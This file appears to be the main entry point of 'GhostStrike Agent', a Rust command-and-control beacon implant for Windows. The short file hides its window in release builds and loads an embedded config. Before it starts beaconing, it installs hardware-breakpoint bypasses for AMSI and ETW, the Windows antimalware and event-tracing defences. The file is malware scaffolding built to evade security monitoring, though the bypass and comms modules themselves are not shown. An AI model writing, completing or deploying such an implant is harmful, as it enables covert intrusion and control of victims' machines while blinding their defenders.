//! GhostStrike Agent — Windows beacon.
//!
//! Compile: cargo build --target x86_64-pc-windows-gnu --release -p ghoststrike-agent
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod beacon;
mod comms;
mod config;
mod tasks;

#[cfg(target_os = "windows")]
mod syscalls;
#[cfg(target_os = "windows")]
mod hwbp;

use anyhow::Result;

#[tokio::main]
async fn main() -> Result<()> {
    let cfg = config::load_embedded_config();

    // Install HWBP-based AMSI/ETW bypass before anything else.
    #[cfg(target_os = "windows")]
    {
        hwbp::install_amsi_bypass();
        hwbp::install_etw_bypass();
    }

    beacon::run(cfg).await
}
